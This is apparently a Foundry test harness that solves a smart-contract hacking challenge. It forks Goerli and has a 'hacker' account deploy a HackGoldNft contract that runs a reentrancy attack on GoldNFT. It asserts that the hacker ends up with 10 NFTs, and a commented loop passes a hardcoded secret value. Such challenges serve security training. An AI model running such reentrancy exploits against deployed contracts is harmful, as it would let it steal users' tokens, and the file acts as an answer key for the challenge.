// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/GoldNFT.sol";
import "../src/HackGoldNft.sol";
import "forge-std/console.sol";
import "forge-std/console2.sol";

contract Hack is Test {
    GoldNFT nft;
    HackGoldNft nftHack;
    address owner = makeAddr("owner");
    address hacker = makeAddr("hacker");

    function setUp() external {
        vm.createSelectFork("goerli", 8591866); 
        nft = new GoldNFT();
    }

    function test_Attack() public {
        vm.startPrank(hacker);
        /*for (uint256 i = 0; i<10; i++){
            nft.takeONEnft(0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe);
        }*/
        nftHack = new HackGoldNft(address(nft));
        nftHack.initializeReent();
        nftHack.withdrawNFTs();
        
        //console.logBytes(codeP);
        // solution
        assertEq(nft.balanceOf(hacker), 10);
    }
}